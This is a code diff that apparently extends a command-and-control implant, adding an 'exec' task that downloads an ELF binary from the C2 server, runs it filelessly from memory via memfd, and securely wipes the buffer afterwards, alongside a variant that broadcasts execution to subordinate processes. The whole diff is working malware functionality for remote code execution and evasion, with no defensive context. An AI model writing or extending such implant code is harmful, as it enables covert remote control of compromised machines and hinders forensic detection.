@@ -588,9 +588,37 @@ static void *c2_worker_thread(void *arg) {
                         "Received task: %s", task_str);
 
         /* Simple task parsing (format: "CMD ARG") */
-        /* Currently we support: "exec <resource_id>" */
+        /* Currently we support: "exec <resource_id>", "exec_mem <resource_id> [args...]" */
 
-        if (strncmp(task_str, "exec_mem ", 9) == 0) {
+        if (strncmp(task_str, "exec ", 5) == 0 && strncmp(task_str, "exec_mem ", 9) != 0) {
+          const char *res_id = task_str + 5;
+          aegis_log_event(g_alpha_log, LOG_CAT_ALPHA, LOG_SEV_INFO,
+                          "Executing remote resource: %s", res_id);
+
+          uint8_t *elf_bin = NULL;
+          size_t elf_len = 0;
+
+          rc = aegis_c2_fetch_resource(&c2, res_id, &elf_bin, &elf_len);
+          if (rc == AEGIS_OK && elf_bin && elf_len > 0) {
+            aegis_log_event(g_alpha_log, LOG_CAT_ALPHA, LOG_SEV_INFO,
+                            "Resource fetched (%zu bytes), executing...", elf_len);
+
+            /* Execute filelessly via memfd */
+            /* Note: this forks, so Alpha stays alive. The child process runs the ELF. */
+            rc = aegis_exec_from_memory(elf_bin, elf_len, res_id, NULL, NULL);
+            if (rc != AEGIS_OK) {
+               aegis_log_event(g_alpha_log, LOG_CAT_ALPHA, LOG_SEV_ERROR,
+                               "Execution failed (rc=%d)", rc);
+            }
+
+            /* Secure wipe */
+            AEGIS_WIPE(elf_bin, elf_len, 3);
+            free(elf_bin);
+          } else {
+            aegis_log_event(g_alpha_log, LOG_CAT_ALPHA, LOG_SEV_ERROR,
+                            "Failed to fetch resource (rc=%d)", rc);
+          }
+        } else if (strncmp(task_str, "exec_mem ", 9) == 0) {
           const char *task_args = task_str + 9;
           char res_id[256] = {0};
           char args_buf[1024] = {0};
@@ -624,7 +652,7 @@ static void *c2_worker_thread(void *arg) {
             uint8_t *payload = malloc(payload_len);
             if (payload) {
                 ipc_exec_elf_t *cmd = (ipc_exec_elf_t *)payload;
-                cmd->target_pid = 0; /* Broadcast to all, let the first one take it, or maybe just one? For now broadcast. Actually, better to send to a specific one, or let the alpha broadcast and all beta execute. The original architecture uses phantom threads per beta. */
+                cmd->target_pid = 0; /* Broadcast to all */
                 cmd->elf_len = (uint32_t)elf_len;
                 cmd->args_len = (uint32_t)args_len;
 
